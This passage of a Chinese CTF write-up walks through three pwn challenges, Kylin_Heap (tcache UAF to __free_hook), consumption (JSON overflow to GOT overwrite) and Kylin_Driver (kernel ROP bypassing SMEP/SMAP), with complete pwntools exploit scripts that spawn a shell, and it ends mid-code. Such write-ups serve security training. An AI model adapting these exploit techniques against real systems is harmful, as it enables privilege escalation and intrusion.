punctuation">:</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>sla  <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>r    <span class="token operator">=</span> <span class="token keyword">lambda</span> num      <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span>num<span class="token punctuation">)</span>ru   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>DROP<span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>data<span class="token punctuation">,</span>drop<span class="token operator">=</span>DROP<span class="token punctuation">)</span>rl  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>ep   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span>data<span class="token punctuation">]</span>eg   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>data<span class="token punctuation">]</span>es   <span class="token operator">=</span> <span class="token keyword">lambda</span> data       <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>ls   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>itr  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>ic   <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>pt   <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m %s --- %s \033[0m'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg   <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>pwn<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="Kylin-Heap：libc2-31-无限制UAF"><a href="#Kylin-Heap：libc2-31-无限制UAF" class="headerlink" title="Kylin_Heap：libc2.31 无限制UAF"></a>Kylin_Heap：libc2.31 无限制UAF</h1><p>直接tcache 打 __free_hook</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment">#@Author:X1NRI</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#from LibcSearcher import LibcSearcher</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#dbg(None)</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span>gdbscript<span class="token operator">=</span>command<span class="token punctuation">)</span><span class="token comment">#pause()</span><span class="token comment">#------------------------------------------------------------------</span><span class="token keyword">def</span> <span class="token function">menu</span><span class="token punctuation">(</span>choice<span class="token punctuation">)</span><span class="token punctuation">:</span>sla<span class="token punctuation">(</span><span class="token string">'What will you do, adventurer?'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>choice<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'bytes): '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'bytes):'</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'): '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'): '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'bytes):'</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'): '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>add<span class="token punctuation">(</span><span class="token number">0x410</span><span class="token punctuation">,</span><span class="token string">b'aaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span><span class="token string">b'aaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span><span class="token string">b'aaa'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>ru<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span><span class="token boolean">True</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address<span class="token operator">=</span>u64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x1ebbe0</span>lg<span class="token punctuation">(</span><span class="token string">'libc'</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>__free_hook<span class="token operator">=</span>ls<span class="token punctuation">(</span><span class="token string">'__free_hook'</span><span class="token punctuation">)</span>system<span class="token operator">=</span>ls<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>__free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token comment">#3</span>add<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#4</span>delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>dbg<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>itr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>bits<span class="token operator">=</span><span class="token number">64</span><span class="token punctuation">,</span>endian<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span><span class="token string">"splitw"</span><span class="token punctuation">,</span><span class="token string">"-h"</span><span class="token punctuation">,</span><span class="token string">"-l 100"</span><span class="token punctuation">]</span>binary<span class="token operator">=</span><span class="token string">'./pwn'</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>libc<span class="token operator">=</span>elf<span class="token punctuation">.</span>libc<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>s  <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sl   <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sa   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>sla  <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>r    <span class="token operator">=</span> <span class="token keyword">lambda</span> num      <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span>num<span class="token punctuation">)</span>ru   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>DROP<span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>data<span class="token punctuation">,</span>drop<span class="token operator">=</span>DROP<span class="token punctuation">)</span>rl  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>ep   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span>data<span class="token punctuation">]</span>eg   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>data<span class="token punctuation">]</span>es   <span class="token operator">=</span> <span class="token keyword">lambda</span> data       <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>ls   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>itr  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>ic   <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>pt   <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m %s --- %s \033[0m'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg   <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>pwn<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="consumption：json序列化-指针覆盖打GOT"><a href="#consumption：json序列化-指针覆盖打GOT" class="headerlink" title="consumption：json序列化+指针覆盖打GOT"></a>consumption：json序列化+指针覆盖打GOT</h1><pre class="line-numbers language-text" data-language="text"><code class="language-text">[*] '/home/xinri/ccb/consumption/pwn'    Arch:       i386-32-little    RELRO:      No RELRO    Stack:      Canary found    NX:         NX enabled    PIE:        No PIE (0x8047000)    RUNPATH:    b'/home/xinri/glibc-all-in-one/libs/2.31-0ubuntu9.16_i386/'    SHSTK:      Enabled    IBT:        Enabled    Stripped:   No<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>漏洞点在于输入json序列化数据到 v12 时可以覆盖到 v13 存储的指针<br><img src="/EXP_FILE/3f4738a03ed191dd7d29c949cb51c49b_MD5.jpeg"></p><p>这里的<code>*a3</code>就是 v13 存储的指针，可以覆盖为 heaparray 打GOT<br><img src="/EXP_FILE/1b5d02b0735b4b49c0ee482948b40c20_MD5.jpeg"></p><p>有个坑点是 error() 函数除了输出“out!”并没有什么用处，但我先入为主以为会exit，白耗了很长时间，nm<br><img src="/EXP_FILE/4577a05dba2432dd602cae7dc5d8c078_MD5.jpeg"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>  <span class="token keyword">import</span> json    context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>  p <span class="token operator">=</span> elf<span class="token punctuation">.</span>process<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment">#libc = ELF("/home/kamome/tools/glibc-all-in-one/libs/2.31-0ubuntu9.16_i386/libc.so.6")  </span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc.so.6"</span><span class="token punctuation">)</span>  <span class="token keyword">def</span> debug<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      pause<span class="token punctuation">(</span><span class="token punctuation">)</span>      gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>      sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> add_heap<span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>      p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"5.exit\t\n"</span><span class="token punctuation">,</span><span class="token string">b'&#123;"choice":"1","idx":0,"size":"'</span> <span class="token operator">+</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'","content":"'</span> <span class="token operator">+</span> content <span class="token operator">+</span> <span class="token string">b'"&#125;'</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> free_heap<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>      p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"5.exit\t\n"</span><span class="token punctuation">,</span><span class="token string">'&#123;"choice":"2","idx":'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">',"size":"","content":""&#125;'</span><span class="token punctuation">)</span>      <span class="token keyword">def</span> show_heap<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>      p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"5.exit\t\n"</span><span class="token punctuation">,</span><span class="token string">'&#123;"choice":"3","idx":'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">',"size":"","content":""&#125;'</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> edit_heap<span class="token punctuation">(</span>idx<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>      p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"5.exit\t\n"</span><span class="token punctuation">,</span><span class="token string">b'&#123;"choice":"4","idx":1,"size":"","content":"'</span> <span class="token operator">+</span> content <span class="token operator">+</span> <span class="token string">b'"&#125;'</span><span class="token punctuation">)</span>    <span class="token comment">#debug()  </span><span class="token comment">#pause()  </span>  heaplist <span class="token operator">=</span> <span class="token number">0x08051B10</span>  add_heap<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"/bin/sh"</span><span class="token punctuation">)</span>    <span class="token comment">#free_got = elf.got["free"]  </span>printf_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"printf"</span><span class="token punctuation">]</span>    payload_1 <span class="token operator">=</span> <span class="token string">b"A"</span> <span class="token operator">*</span> <span class="token number">0x4cc</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>heaplist <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span>  add_heap<span class="token punctuation">(</span>printf_got<span class="token punctuation">,</span>payload_1<span class="token punctuation">)</span>  <span class="token comment">#add_heap(0x8,"AAAA")  </span>  show_heap<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  libc<span class="token punctuation">.</span>address <span class="token operator">=</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"\xf7"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"printf"</span><span class="token punctuation">]</span>  log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"libc.address = "</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>    system <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>    edit_heap<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">b"A"</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>    free_heap<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token comment">#debug()  </span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="Kylin-Driver：kROP"><a href="#Kylin-Driver：kROP" class="headerlink" title="Kylin_Driver：kROP"></a>Kylin_Driver：kROP</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span>qemu-system-x86_64 <span class="token punctuation">\</span>    <span class="token parameter variable">-m</span> 256M <span class="token punctuation">\</span>    <span class="token parameter variable">-kernel</span> bzImage <span class="token punctuation">\</span>    <span class="token parameter variable">-initrd</span> rootfs.cpio <span class="token punctuation">\</span>    <span class="token parameter variable">-monitor</span> /dev/null <span class="token punctuation">\</span>    <span class="token parameter variable">-append</span> <span class="token string">"root=/dev/ram console=ttyS0 loglevel=8 ttyS0,115200 kaslr"</span> <span class="token punctuation">\</span>    <span class="token parameter variable">-cpu</span> kvm64,+smep,+smap <span class="token punctuation">\</span>    <span class="token parameter variable">-netdev</span> user,id<span class="token operator">=</span>t0, <span class="token parameter variable">-device</span> e1000,netdev<span class="token operator">=</span>t0,id<span class="token operator">=</span>nic0 <span class="token punctuation">\</span>    <span class="token parameter variable">-nographic</span> <span class="token punctuation">\</span>    -no-reboot <span class="token punctuation">\</span>    -no-shutdown <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>打开了 SMEP、SMAP、KASLR，经测试开了KPTI</p><p>载入了一个LKM，位置在 &#x2F;lib&#x2F;modules&#x2F;5.10.0-9-generic&#x2F;kernel&#x2F;test.ko</p><p>注册了杂项设备结合注册结构体可知设备名称为test，该类设备的应用层接口位于&#x2F;dev目录，并且为该设备注册了处理函数<code>VrQsLpXwNfJrZtBpKjMvWsQpTyLnHrXs</code>。<br><img src="/EXP_FILE/c058402f080a342ea7305b929cc5681b_MD5.jpeg"></p><p><img src="/EXP_FILE/8e0fe6162bb3e5123ef9de3016c2b472_MD5.jpeg"></p><p>首先校验我们传入的buf，要求逐位与0xF9异或之后等于<code>gtwYHamW4U2yQ9LQzfFJSncfHgFf5Pjc</code></p><ul><li>0xDEADBEEF操作码：将驱动模块基址放进kbuf，再将整个kbuf与0xF9异或后放入到 buf + 0x20 处（password后面）</li><li>0xFEEDFACE操作码：将 buf+0x20 再拿出来与0xF9异或后放入kbuf，rsp指向kbuf进行retn<br><img src="/EXP_FILE/13c60f00d2f10013a8a5466b486e0fcb_MD5.jpeg"></li></ul><p>设置 nokaslr 后内核直接卡死了，目前原因不明，只能硬调kaslr了<br><img src="/EXP_FILE/74b280be16995e17cd80a281600b9a79_MD5.jpeg"></p><p>先走常规rop链，我一开始不明白给我们一个LKM基址有什么用，哦原来是LKM里有对cr4操作的gadget，不关SMAP的话commit_cred会crash<br><img src="/EXP_FILE/ddce91073f73e8b83a9f81d9b0681095_MD5.jpeg"></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_GNU_SOURCE</span> </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token 